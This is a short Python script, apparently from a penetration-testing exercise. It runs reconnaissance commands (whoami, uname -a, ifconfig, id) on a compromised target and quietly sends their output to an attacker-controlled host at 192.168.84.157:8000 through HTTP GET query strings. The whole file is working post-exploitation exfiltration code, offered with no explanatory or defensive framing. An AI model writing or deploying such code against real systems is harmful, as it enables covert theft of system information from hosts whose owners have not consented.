import requests
import urllib
import sys
import subprocess

class MyShell:
    """
    This script will run on the target, execute specific commands and make request to the attacker's machine such as Kali. The request will include execution result.
    This script on the target's side does'nt need to print out any informaiton.
    """
    def __init__(self) -> None:
        self.url = 'http://192.168.84.157:8000/index.html'
        self.commands = ['whoami', 'uname -a', 'ifconfig', 'id']
        self.result = {}
    
    def run(self):
        for command in self.commands:
            try:
                self.result[command] = subprocess.check_output(command, shell=True).decode('utf-8')
            except:
                self.result[command] = 'Failed to execute command: %s' % command
            finally:
                requests.get(url=self.url + '?' + urllib.parse.urlencode(self.result))


if __name__ == '__main__':
    myshell =MyShell()
    myshell.run()